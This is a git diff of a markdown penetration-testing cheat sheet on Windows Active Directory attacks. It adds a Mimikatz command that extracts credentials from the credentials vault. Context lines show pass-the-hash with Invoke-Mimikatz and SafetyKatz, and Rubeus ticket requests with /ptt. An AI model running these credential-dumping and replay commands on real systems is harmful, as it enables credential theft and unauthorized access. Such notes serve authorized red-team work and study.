@@ -136,7 +136,7 @@ Impacket
 Physmem2profit
 </code></pre>
 
-## Mimikatz - Invoke-Mimikatz
+## 🐱 Mimikatz - Invoke-Mimikatz
 
 * Dump credentials, tickets, passing & replaying hashes
 * Using the code from ReflectivePEInjection mimikatz is loaded reflectively into memory.
@@ -161,7 +161,18 @@ Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:dom.local /
 ```
 {% endcode %}
 
-Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.\
+Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.
+
+
+
+**Extracting credentials from credentials vault / scheduled tasks**
+
+```powershell
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
+```
+
+
+
 
 
 ## **🍳Kerberoasting**
@@ -220,9 +231,4 @@ Safetykatz.exe "sekurlsa::pth /user:administrator /domain:dom.local /aes256:hash
 </strong><strong>
 </strong><strong>Needs admin rights:
 </strong><strong>Rubeus.exe asktgt /user:administrator /aes256:hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-</strong>
-
-</code></pre>
-
-
-
+</strong></code></pre>
